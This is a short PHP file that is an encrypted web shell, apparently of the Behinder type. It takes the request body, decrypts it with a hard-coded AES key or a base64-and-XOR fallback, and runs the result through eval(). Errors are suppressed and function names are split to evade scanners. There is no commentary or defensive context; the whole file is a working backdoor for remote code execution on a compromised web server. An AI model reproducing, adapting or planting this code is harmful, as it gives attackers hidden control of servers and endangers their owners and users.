<?php
@error_reporting(0);
session_start();
$key="f22ca0737cb3bfa0";
$_SESSION['k']=$key;
session_write_close();
$post=file_get_contents("php://input");
$decrypted = false;
if(extension_loaded('openssl') && !empty($post))
{
    $decrypted = openssl_decrypt($post, "AES128", $key);
}
if($decrypted === false && !empty($post))
{
    $t="base64_" . "decode";
    $decoded = $t(trim($post));
    
    if($decoded !== false) {
        $result = "";
        for($i=0; $i<strlen($decoded); $i++) {
            $result .= chr(ord($decoded[$i]) ^ ord($key[($i+1)&15])); 
        }
        $decrypted = $result;
    }
}
if($decrypted !== false) {
    $arr=explode('|',$decrypted);
    if(count($arr) >= 2) {
        $func=$arr[0];
        $params=$arr[1];
        class C{public function __invoke($p) {eval($p."");}}
        @call_user_func(new C(),$params);
    }
}
?>